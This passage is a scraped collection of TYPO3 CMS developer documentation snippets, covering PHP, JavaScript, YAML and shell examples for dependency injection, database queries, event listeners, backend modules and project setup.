TYPO3\nDESCRIPTION: Example of marking a service as public using the Autoconfigure attribute to override default visibility settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n#[Autoconfigure(public: true)]\nclass MyServiceUsingAutoconfigurePublicTrue\n{\n    // Service implementation\n}\n```\n\n----------------------------------------\n\nTITLE: ModifyPageLayoutContentEvent Class Definition\nDESCRIPTION: PHP class that provides methods to modify header and footer content of the TYPO3 page module. The class offers functionality to get HTTP requests, access module templates, and manipulate content sections.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyPageLayoutContentEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Controller\\Event;\n\nclass ModifyPageLayoutContentEvent {\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface;\n    public function getModuleTemplate(): \\TYPO3\\CMS\\Backend\\Template\\ModuleTemplate;\n    public function setHeaderContent(string $content);\n    public function addHeaderContent(string $content);\n    public function getHeaderContent(): string;\n    public function setFooterContent(string $content);\n    public function addFooterContent(string $content);\n    public function getFooterContent(): string;\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Global Driver Middleware in TYPO3\nDESCRIPTION: Shows how to register a global Doctrine DBAL driver middleware that will be applied to all database connections.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Middleware/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['DB']['globalMiddlewares'] = array_merge(\n    $GLOBALS['TYPO3_CONF_VARS']['DB']['globalMiddlewares'] ?? [],\n    [\n        'my-middleware' => [\n            'target' => \\Vendor\\Extension\\Driver\\MyDriverMiddleware::class,\n            'after' => ['typo3/core/custom-platform-driver-middleware'],\n        ],\n    ]\n);\n```\n\n----------------------------------------\n\nTITLE: Setting Up TYPO3 Project with DDEV\nDESCRIPTION: This shell script demonstrates setting up the 'site-introduction' TYPO3 project using DDEV commands. It includes cloning the repository, starting the containers, and importing the database and files necessary for the project. Ensures all containers are running and the TYPO3 instance is accessible.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Acceptance.rst#2025-04-16_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nlolli@apoc /var/www/local $ git clone git@github.com:TYPO3-Documentation/site-introduction.git\nlolli@apoc /var/www/local $ cd site-introduction\nlolli@apoc /var/www/local/site-introduction $ ddev start\nlolli@apoc /var/www/local/site-introduction $ ddev import-db --src=./data/db.sql\nlolli@apoc /var/www/local/site-introduction $ ddev import-files --src=./assets\nlolli@apoc /var/www/local/site-introduction $ ddev composer install\n```\n\n----------------------------------------\n\nTITLE: DataHandler with Alternative User (PHP)\nDESCRIPTION: Demonstrates using DataHandler with an alternative backend user object for data submission and command execution.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/UsingDataHandler/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\DataHandling\\DataHandler;\\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\\n\\n$dataHandler = GeneralUtility::makeInstance(DataHandler::class);\\n$dataHandler->start($data, $cmd, $alternativeUser);\\n$dataHandler->process_datamap();\\n$dataHandler->process_cmdmap();\n```\n\n----------------------------------------\n\nTITLE: Using union and addUnion in TYPO3 Query Builder (PHP)\nDESCRIPTION: Shows how to use the union and addUnion methods to combine result sets from multiple queries. The example demonstrates creating a UNION query with two subqueries on the tt_content table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_23\n\nLANGUAGE: php\nCODE:\n```\n// Prepare the connection and main query builder\n$connection = $this->connectionPool->getConnectionForTable('tt_content');\n$queryBuilder = $connection->createQueryBuilder();\n\n// Prepare sub-query builders\n$queryBuilder1 = $connection->createQueryBuilder();\n$queryBuilder2 = $connection->createQueryBuilder();\n$expr = $queryBuilder->expr();\n\n// Build the UNION query\n$result = $queryBuilder\n    ->union(\n        $queryBuilder1\n            ->select('uid', 'pid', 'header')\n            ->from('tt_content')\n            ->where($expr->eq('CType', $queryBuilder->createNamedParameter('text')))\n    )\n    ->addUnion(\n        $queryBuilder2\n            ->select('uid', 'pid', 'header')\n            ->from('tt_content')\n            ->where($expr->eq('CType', $queryBuilder->createNamedParameter('textpic')))\n    )\n    ->orderBy('uid')\n    ->executeQuery()\n    ->fetchAllAssociative();\n```\n\n----------------------------------------\n\nTITLE: Initializing Module Template in a TYPO3 Backend Controller\nDESCRIPTION: This example demonstrates how to properly initialize a ModuleTemplate in a TYPO3 backend module controller. It shows creating a shared method that can be used across multiple actions to ensure consistent module headers and layout.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleTemplateFactory.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplate;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplateFactory;\nuse TYPO3\\CMS\\Core\\Http\\HtmlResponse;\n\nclass BackendModuleController\n{\n    protected ModuleTemplateFactory $moduleTemplateFactory;\n\n    public function __construct(\n        ModuleTemplateFactory $moduleTemplateFactory\n    ) {\n        $this->moduleTemplateFactory = $moduleTemplateFactory;\n    }\n\n    public function handleRequest(ServerRequestInterface $request): ResponseInterface\n    {\n        $moduleTemplate = $this->initializeModuleTemplate($request);\n        // ... add page content here\n        return new HtmlResponse($moduleTemplate->renderContent());\n    }\n\n    protected function initializeModuleTemplate(ServerRequestInterface $request): ModuleTemplate\n    {\n        $moduleTemplate = $this->moduleTemplateFactory->create($request);\n        $moduleTemplate->setTitle('My module');\n        $moduleTemplate->setModuleId('my_module');\n        $moduleTemplate->getDocHeaderComponent()->setMetaInformation([]); // Optional\n        $moduleTemplate->assignMultiple([\n            'foo' => 'bar'\n        ]);\n        return $moduleTemplate;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 Redirect Integrity Event Listener\nDESCRIPTION: Event listener class that adds XML sitemap URLs to the redirect integrity check process. Uses PHP attribute #[AsEventListener] for registration and demonstrates modifying the URLs collection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Redirects/AfterPageUrlsForSiteForRedirectIntegrityHaveBeenCollectedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n#[AsEventListener]\nclass MyEventListener\n{\n    public function __invoke(AfterPageUrlsForSiteForRedirectIntegrityHaveBeenCollectedEvent $event): void\n    {\n        // Add URLs found in XML sitemap to the list of URLs\n        $event->addUrl('https://example.org/page1');\n        $event->addUrl('https://example.org/page2');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Environment Variables in .env File for TYPO3\nDESCRIPTION: This snippet shows an example of defining environment variables in a .env file for a TYPO3 project. It includes settings for database connection, mail configuration, and encryption key.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/EnvironmentConfiguration.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nTYPO3_CONTEXT=\"Development\"\nTYPO3_DB_CONNECTIONS_DEFAULT_HOST=\"127.0.0.1\"\nTYPO3_DB_CONNECTIONS_DEFAULT_PORT=3306\nTYPO3_DB_CONNECTIONS_DEFAULT_USER=\"typo3\"\nTYPO3_DB_CONNECTIONS_DEFAULT_PASS=\"password\"\nTYPO3_DB_CONNECTIONS_DEFAULT_NAME=\"typo3_db\"\n\nTYPO3_MAIL_TRANSPORT=\"smtp\"\nTYPO3_MAIL_TRANSPORT_SMTP_SERVER=\"localhost:1025\"\n\nTYPO3_ENCRYPTIONKEY=\"ab4cb84d7c140e0f3cd76533554b371c0708c745f7a90f23be68d26bbb0a1ecc\"\n```\n\n----------------------------------------\n\nTITLE: Locking and Unlocking Navigation Steps in MultiStepWizard\nDESCRIPTION: Methods to control the navigation flow by locking and unlocking the next and previous step buttons in a MultiStepWizard.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/MultiStepWizard.rst#2025-04-16_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nMultiStepWizard.lockNextStep();\nMultiStepWizard.unlockNextStep();\nMultiStepWizard.lockPrevStep();\nMultiStepWizard.unlockPrevStep();\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterTypoLinkDecodedEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to implement an event listener for the AfterTypoLinkDecodedEvent in TYPO3. It shows how to manipulate the decoded TypoLink parts by adding a custom attribute.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/LinkHandling/AfterTypoLinkDecodedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\LinkHandling\\EventListener;\n\nuse TYPO3\\CMS\\Core\\LinkHandling\\Event\\AfterTypoLinkDecodedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterTypoLinkDecodedEvent $event): void\n    {\n        $linkParameterParts = $event->getLinkParameterParts();\n\n        // Add custom attribute\n        $linkParameterParts['data-custom'] = 'myValue';\n\n        $event->setLinkParameterParts($linkParameterParts);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Adjusting TCA Registration for CType-based Plugin in TYPO3\nDESCRIPTION: Updates the TCA registration to use CType instead of list_type, including FlexForm and field configuration changes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/MigrationListType.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nExtensionManagementUtility::addPlugin(\n    [\n        'LLL:EXT:examples/Resources/Private/Language/locallang_be.xlf:tt_content.examples_pi_example_content',\n-        'examples_pi_example_content',\n-        'EXT:examples/Resources/Public/Icons/Extension.svg'\n+        'examples_pi_example_content',\n+        'EXT:examples/Resources/Public/Icons/Extension.svg',\n+        'content-plugin'\n    ],\n-    'list_type',\n+    'CType',\n    'examples_pi_example_content'\n);\n\n-$GLOBALS['TCA']['tt_content']['types']['list']['subtypes_excludelist']['examples_pi_example_content'] = 'layout,select_key,pages';\n-$GLOBALS['TCA']['tt_content']['types']['list']['subtypes_addlist']['examples_pi_example_content'] = 'pi_flexform';\n-ExtensionManagementUtility::addPiFlexFormValue(\n-    'examples_pi_example_content',\n-    'FILE:EXT:examples/Configuration/FlexForms/Plugins/PluginContent.xml'\n-);\n+ExtensionManagementUtility::addPiFlexFormValue(\n+    '*',\n+    'FILE:EXT:examples/Configuration/FlexForms/Plugins/PluginContent.xml',\n+    'examples_pi_example_content'\n+);\n+\n+ExtensionManagementUtility::addToAllTCAtypes(\n+    'tt_content',\n+    'pi_flexform',\n+    'examples_pi_example_content',\n+    'after:header'\n+);\n```\n\n----------------------------------------\n\nTITLE: Building Backend Edit URIs in TYPO3 ModuleController\nDESCRIPTION: This method generates a URI for the TYPO3 backend record editor. It configures the edit parameters to modify multiple pages and a custom record, restricts the editable columns for pages, and includes a return URL. The method uses the backend URI builder to construct the final link.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/_UriBuilder/_GetEditDoktypeLink.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\UriInterface;\n\nclass ModuleController extends ActionController\n{\n    protected function getEditDoktypeLink(string $returnUrl): UriInterface\n    {\n        $uriParameters =\n            [\n                'edit' => [\n                    'pages' => [\n                        1 => 'edit',\n                        2 => 'edit',\n                    ],\n                    'tx_examples_haiku' => [\n                        1 => 'edit',\n                    ],\n                ],\n                'columnsOnly' => [\n                    'pages' => [\n                        'title',\n                        'doktype',\n                    ],\n                ],\n                'returnUrl' => $returnUrl,\n            ];\n        return $this->backendUriBuilder->buildUriFromRoute(\n            'record_edit',\n            $uriParameters,\n        );\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Backend URLs in TYPO3 with UriBuilder\nDESCRIPTION: Example showing how to generate backend URLs using the UriBuilder API in a PHP controller. Demonstrates building URLs with routes, parameters, and dynamic controller actions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendRouting.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace Vendor\\MyExtension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Backend\\Routing\\UriBuilder;\nuse TYPO3\\CMS\\Core\\Http\\HtmlResponse;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\nclass MyRouteController\n{\n    public function mainAction(ServerRequestInterface $request): ResponseInterface\n    {\n        $uriBuilder = GeneralUtility::makeInstance(UriBuilder::class);\n        \n        // Create a link to a backend module\n        $uri = $uriBuilder->buildUriFromRoute('web_layout', ['id' => 42]);\n        \n        // Create a link to a custom module controller action\n        $uriWithAction = $uriBuilder->buildUriFromRoute('web_ExtkeyExample.MyModuleController_list');\n        \n        // Build URI based on current request, but with modified parameters\n        $uriFromRequest = $uriBuilder->buildUriFromRequest($request, ['action' => 'edit', 'id' => 42]);\n        \n        // Create a link based on a defined route path (not identifier)  \n        $uriFromPath = $uriBuilder->buildUriFromRoutePath('/module/web/layout');\n        \n        return new HtmlResponse('<p>This is an example response</p>');\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Executing UPDATE Query with Table Alias in TYPO3 CMS\nDESCRIPTION: Demonstrates how to use a table alias in an UPDATE query with the QueryBuilder. It shows setting the table with an alias and using it in conditions and SET clauses.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_12\n\nLANGUAGE: PHP\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n// UPDATE `tt_content` `t` SET `t`.`bodytext` = 'dolor' WHERE `t`.`bodytext` = 'lorem'\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$queryBuilder\n    ->update('tt_content', 't')\n    ->where(\n        $queryBuilder->expr()->eq('t.bodytext', $queryBuilder->createNamedParameter('lorem', Connection::PARAM_STR))\n    )\n    ->set('t.bodytext', 'dolor')\n    ->executeStatement();\n```\n\n----------------------------------------\n\nTITLE: Extbase BackendController Initialize Action\nDESCRIPTION: This snippet demonstrates how to define initialization code within an Extbase BackendController using the `initializeAction()` method. It showcases a scenario where the currently activated page in the page tree is discovered and saved in a variable for later use. The `initializeAction` is called after argument registration but before the main action.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/ActionController.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nnamespace Vendor\\Extension\\Controller;\n\nuse TYPO3\\CMS\\Backend\\Utility\\BackendUtility;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nclass BackendController extends ActionController\n{\n    /**\n     * @var int\n     */\n    protected $id = 0;\n\n    public function initializeAction()\n    {\n        $this->id = (int)BackendUtility::getRecord('pages', (int)$_REQUEST['id'], 'uid');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding a Flash Message as a Notification in TYPO3 CMS\nDESCRIPTION: This snippet illustrates how to add a flash message as a top-right notification in TYPO3 CMS. It uses the FlashMessageQueue::NOTIFICATION_QUEUE identifier to enqueue the message for notification-style display.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/FlashMessagesApi.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Messaging\\FlashMessage;\nuse TYPO3\\CMS\\Core\\Messaging\\FlashMessageQueue;\nuse TYPO3\\CMS\\Core\\Messaging\\FlashMessageService;\nuse TYPO3\\CMS\\Core\\Type\\ContextualFeedbackSeverity;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\n$flashMessageService = GeneralUtility::makeInstance(FlashMessageService::class);\n$notificationQueue = $flashMessageService->getMessageQueueByIdentifier(\n    FlashMessageQueue::NOTIFICATION_QUEUE\n);\n$flashMessage = GeneralUtility::makeInstance(\n    FlashMessage::class,\n    'I am a message rendered as notification',\n    'Hooray!',\n    ContextualFeedbackSeverity::OK\n);\n$notificationQueue->enqueue($flashMessage);\n```\n\n----------------------------------------\n\nTITLE: Accessing Frontend Page Information in TYPO3 CMS\nDESCRIPTION: Example showing how to retrieve page information using the frontend.page.information request attribute. This includes accessing the page ID, page record, and both regular and local root line data. This replaces the previous TSFE-based access methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/FrontendPageInformation.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n/** @var \\TYPO3\\CMS\\Frontend\\Page\\PageInformation $pageInformation */\n$pageInformation = $request->getAttribute('frontend.page.information');\n\n// Formerly $tsfe->id\n$id = $pageInformation->getId();\n\n// Formerly $tsfe->page\n$page = $pageInformation->getPageRecord();\n\n// Formerly $tsfe->rootLine\n$rootLine = $pageInformation->getRootLine();\n\n// Formerly $tsfe->config['rootLine']\n$rootLine = $pageInformation->getLocalRootLine();\n```\n\n----------------------------------------\n\nTITLE: Logging Error with Context Information in TYPO3\nDESCRIPTION: Example of logging an error message with additional context information in a TYPO3 extension. This demonstrates how to use placeholders in the message text and provide context values in an array.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Quickstart/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$this->logger->error('Passing {value} was unwise.', [\n    'value' => $value,\n    'other_data' => $foo,\n]);\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyPageLayoutOnLoginProviderSelectionEvent Class Methods\nDESCRIPTION: Class methods for the ModifyPageLayoutOnLoginProviderSelectionEvent that allow modification of view variables based on login provider selection. Includes methods to get the view interface and server request.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyPageLayoutOnLoginProviderSelectionEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getView()\n:returns: `\\TYPO3\\CMS\\Core\\View\\ViewInterface`\n```\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getRequest()\n:returns: `\\Psr\\Http\\Message\\ServerRequestInterface`\n```\n\n----------------------------------------\n\nTITLE: Updating Existing Page Records in PHP\nDESCRIPTION: Example showing how to update properties of an existing page record.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Database/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n$data['pages'][9834] = [\n    'title' => 'New title for this page',\n    'no_cache' => '1'\n];\n```\n\n----------------------------------------\n\nTITLE: Registering Custom MetaTagManager in TYPO3 Extension Configuration\nDESCRIPTION: Demonstrates how to register a custom MetaTagManager in the ext_localconf.php file of a TYPO3 extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/MetaTagApi.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\n    \\TYPO3\\CMS\\Core\\MetaTag\\MetaTagManagerRegistry::class\n)->registerManager(\n    'custom',\n    \\MyVendor\\MyExtension\\MetaTag\\CustomMetaTagManager::class\n);\n```\n\n----------------------------------------\n\nTITLE: PHP Class Definition: UriBuilder for TYPO3 Extbase\nDESCRIPTION: Core class definition of the UriBuilder with methods for URI generation and configuration. Contains comprehensive method documentation for all URI building operations including request handling, argument processing, and URI formatting.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/UriBuilder.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Extbase\\Mvc\\Web\\Routing;\n\nclass UriBuilder {\n    public function setRequest(\\TYPO3\\CMS\\Extbase\\Mvc\\RequestInterface $request): static;\n    public function setArguments(array $arguments): static;\n    public function setSection(string $section): static;\n    public function setFormat(string $format): static;\n    public function setCreateAbsoluteUri(bool $createAbsoluteUri): static;\n    public function setAbsoluteUriScheme(string $absoluteUriScheme): static;\n    public function setLanguage(?string $language): \\TYPO3\\CMS\\Extbase\\Mvc\\Web\\Routing\\UriBuilder;\n    public function setAddQueryString(string|int|bool $addQueryString): static;\n    public function setArgumentsToBeExcludedFromQueryString(array $argumentsToBeExcludedFromQueryString): static;\n    public function setArgumentPrefix(string $argumentPrefix): static;\n    public function setLinkAccessRestrictedPages(bool $linkAccessRestrictedPages): static;\n    public function setTargetPageUid(int $targetPageUid): static;\n    public function setTargetPageType(int $targetPageType): static;\n    public function setNoCache(bool $noCache): static;\n    public function reset(): static;\n    public function uriFor(?string $actionName = NULL, ?array $controllerArguments = NULL, ?string $controllerName = NULL, ?string $extensionName = NULL, ?string $pluginName = NULL): string;\n    public function build(): string;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Cache Backend for TYPO3 Pages Cache\nDESCRIPTION: Example configuration for setting up a Redis cache backend on database 42 with compression enabled for the TYPO3 pages cache. This configuration should be placed in the system settings file to override default database backend settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/QuickStart/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations']['pages']['backend'] = \\TYPO3\\CMS\\Core\\Cache\\Backend\\RedisBackend::class;\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations']['pages']['options'] = [\n    'database' => 42,\n    'compression' => true,\n];\n```\n\n----------------------------------------\n\nTITLE: Performing Database Delete in TYPO3\nDESCRIPTION: Example of using the Connection->delete() method to remove records from a database table. This method creates and executes a DELETE query with WHERE conditions limited to equality comparisons.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\npublic function someMethod(): void\n{\n    $connection = $this->connectionPool->getConnectionForTable('tx_myextension_domain_model_mytable');\n    $connection->delete(\n        'sys_lockedrecords',\n        [\n            'userid' => 42,\n            'tstamp' => 1415812333,\n        ],\n        [\n            Connection::PARAM_INT,\n            Connection::PARAM_INT,\n        ]\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Data Listener for the BeforeRecordDownloadIsExecutedEvent in TYPO3\nDESCRIPTION: This code demonstrates how to create an event listener that redacts columns containing private content before data exports. The listener checks for specific tables and fields to redact personal information, replacing content with '[redacted]' to ensure GDPR compliance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/BeforeRecordDownloadIsExecutedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\RecordList\\Event\\BeforeRecordDownloadIsExecutedEvent;\n\n/**\n * Event listener for modifying download data\n */\nfinal class DataListener\n{\n    public function __invoke(BeforeRecordDownloadIsExecutedEvent $event): void\n    {\n        if ($event->getTable() === 'fe_users') {\n            // Redact private data in exports\n            $fieldList = $event->getFieldList();\n            $rows = $event->getRows();\n            foreach ($rows as &$row) {\n                // Redact personally identifiable information\n                if (isset($row['email'])) {\n                    $row['email'] = '[redacted]';\n                }\n                if (isset($row['address'])) {\n                    $row['address'] = '[redacted]';\n                }\n                if (isset($row['zip'])) {\n                    $row['zip'] = '[redacted]';\n                }\n                if (isset($row['city'])) {\n                    $row['city'] = '[redacted]';\n                }\n                if (isset($row['telephone'])) {\n                    $row['telephone'] = '[redacted]';\n                }\n            }\n            $event->setRows($rows);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Combining select() and addSelect() in TYPO3 Query Builder\nDESCRIPTION: Example showing how to combine select() and addSelect() methods to conditionally add fields to a query.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$queryBuilder->select(...$defaultList);\nif ($needAdditionalFields) {\n    $queryBuilder->addSelect(...$additionalFields);\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Hotkey in TYPO3 Backend using JavaScript\nDESCRIPTION: This example demonstrates how to register a custom hotkey in the TYPO3 backend using the Hotkey API. It shows the usage of the register() method with hotkey definition, handler function, and options object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/HotkeyApi/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport Hotkeys, { ModifierKeys } from '@typo3/backend/hotkeys.js';\n\n// Register a hotkey that opens the page tree\nHotkeys.register(\n  [Hotkeys.normalizedCtrlModifierKey, ModifierKeys.SHIFT, 'p'],\n  () => {\n    top.TYPO3.Backend.NavigationContainer.PageTree.toggle();\n  },\n  {\n    scope: 'module.web',\n    allowOnEditables: true,\n    allowRepeat: false,\n    bindElement: document.querySelector('.t3js-topbar-button-pagetree')\n  }\n);\n```\n\n----------------------------------------\n\nTITLE: Debugging Query Builder in TYPO3 PHP\nDESCRIPTION: This snippet demonstrates how to use the Query Builder to construct a SELECT query, debug the SQL, and execute the query. It selects the 'uid' from 'tt_content' where 'bodytext' equals 'lorem'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/TipsAndTricks/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$queryBuilder\n    ->select('uid')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq(\n            'bodytext',\n            $queryBuilder->createNamedParameter('lorem')\n        )\n    );\n\ndebug($queryBuilder->getSql());\n\n$result = $queryBuilder->executeQuery();\n```\n\n----------------------------------------\n\nTITLE: Overriding Event Listener via Services.yaml in TYPO3\nDESCRIPTION: This YAML configuration shows how to override an existing event listener using the Services.yaml file in a TYPO3 extension. It specifies the overridden identifier to replace the original implementation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/EventDispatcher/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  MyVendor\\MyExtension\\EventListener\\MySeoEvent:\n    tags:\n      - name: event.listener\n        identifier: 'ext-some-extension/modify-hreflang'\n        event: TYPO3\\CMS\\Frontend\\Event\\ModifyHrefLangTagsEvent\n```\n\n----------------------------------------\n\nTITLE: FileUpload Attribute Configuration with Validation Rules\nDESCRIPTION: Example of a FileUpload attribute configuration in an Extbase domain model class. This demonstrates how to set various validation rules including file size limits, MIME type restrictions, and image dimension constraints.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FileUpload.rst#2025-04-16_snippet_6\n\nLANGUAGE: PHP\nCODE:\n```\n#[FileUpload([\n    'validation' => [\n        'required' => true,\n        'maxFiles' => 1,\n        'fileSize' => ['minimum' => '0K', 'maximum' => '2M'],\n        'allowedMimeTypes' => ['image/jpeg'],\n        'imageDimensions' => ['maxWidth' => 4096, 'maxHeight' => 4096]\n    ],\n    'uploadFolder' => '1:/user_upload/extbase_single_file/',\n])]\n```\n\n----------------------------------------\n\nTITLE: Using RegularEvent Strategy in TYPO3 JavaScript Event API\nDESCRIPTION: Shows how to use the RegularEvent strategy which attaches a simple event listener to an event and element. This is the common use case for event handling in TYPO3.\nSOURCE: 